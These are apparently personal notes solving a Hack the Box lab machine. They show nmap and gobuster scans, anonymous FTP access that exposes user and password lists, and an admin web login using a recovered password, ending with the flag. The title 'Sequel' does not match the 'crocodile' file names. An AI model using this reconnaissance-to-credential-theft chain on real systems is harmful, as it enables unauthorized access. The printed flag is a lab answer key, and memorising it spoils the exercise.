Hack the Box
Starting Point

Sequel

10.129.143.85

nmap -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/crocodile 10.129.143.85

Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-19 00:09 Americas
Nmap scan report for 10.129.143.85
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.41
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix


ftp 10.129.143.85
Connected to 10.129.143.85.
220 (vsFTPd 3.0.3)
Name (10.129.143.85:abc): anonymous
230 Login successful.

ftp> get allowed.userlist
ftp> get allowed.userlist.passwd

$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
abc@cd1d95f54ad3:~/BlueGh05t/CTF/HTB/starting_point/crocodile$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd


gobuster -u 10.129.143.85 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,htm

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.129.143.85/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : htm,php,html
[+] Timeout      : 10s
=====================================================
2023/06/19 00:18:17 Starting gobuster
=====================================================
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/css (Status: 301)
/js (Status: 301)
/logout.php (Status: 302)
/config.php (Status: 200)

http://10.129.143.85/login.php

username: admin
password: rKXM59ESxesUFHAd

Here is your flag: c7110277ac44d78b6a9fff2232434d16